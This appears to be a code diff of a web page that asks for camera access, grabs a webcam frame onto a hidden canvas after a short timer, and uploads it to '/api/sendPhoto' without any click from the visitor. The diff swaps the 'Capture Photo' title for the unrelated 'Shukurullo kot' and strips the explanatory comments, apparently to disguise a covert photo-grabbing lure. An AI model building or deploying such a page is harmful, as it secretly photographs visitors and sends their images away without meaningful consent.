@@ -3,20 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capture Photo</title>
+    <title>Shukurullo kot</title>
 </head>
 <body>
-    <h1>Capture Photo</h1>
+    <h1>Shukurullo kot</h1>
     <video id="video" width="640" height="480" autoplay></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        // Get the video and canvas elements
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
 
-        // Function to send the captured image to the server
         function sendImage(dataURL) {
             fetch('/api/sendPhoto', {
                 method: 'POST',
@@ -34,12 +32,10 @@
             });
         }
 
-        // Prompt the user for permission, get the stream, and set the video source
         navigator.mediaDevices.getUserMedia({ video: true })
             .then((stream) => {
                 video.srcObject = stream;
 
-                // Automatically capture the photo after the video stream starts
                 video.onloadedmetadata = () => {
                     setTimeout(() => {
                         context.drawImage(video, 0, 0, 640, 480);
